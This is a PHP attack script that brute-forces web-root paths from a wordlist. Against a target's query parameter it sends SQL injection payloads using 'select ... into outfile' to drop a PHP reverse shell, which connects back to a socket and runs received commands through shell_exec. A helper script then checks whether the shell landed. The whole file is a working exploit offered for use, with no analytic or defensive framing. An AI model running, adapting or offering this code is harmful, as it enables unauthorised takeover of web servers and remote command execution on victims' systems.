<?php
if(!isset($argv[1])){
    echo '[+] usage : upload_magnify.php hostname index (optionnal) method param';
    exit;
}else{
$index=$argv[2];
$hostname=$argv[1];
$method=$argv[3];
$param=$argv[4];
}
$wordlist=fopen("wordlist.txt",'r') or die('[+] no such file or directory :(');
function get($wordlist){
    global $index;
    global $cmd;
    global $hostname,$method,$param;
    $splited=explode('::',fread($wordlist,20258)); // the buffer size is depending on the file size (20258)
    foreach($splited as $possibility){
    $p=explode("\n",$possibility)[0];
    $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; #"
,"b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile " ."\"$p\" #");
    print_r($cmd);
        //echo "trying with : ".$possibility
        foreach($cmd as $command){
            $api=socket_create(AF_INET,SOCK_STREAM,0);
            socket_connect($api,$hostname,80) or die('unable to reach the target host');
            $request="GET $index?$param=".urlencode($command)." HTTP/1.1\r\nHost: ".$hostname."\r\nConnection: Close\r\n\r\n";
            echo $request;
            socket_write($api,$request);
            echo socket_read($api,1024);
            socket_close($api);
	    if (shell_exec("php verify.php ".$hostname)=='1'){
                echo "found : $possibility";
                exit;}
               }}}
if ($argv[3]=='get'){
    get($wordlist);
}
fclose($wordlist);
?>
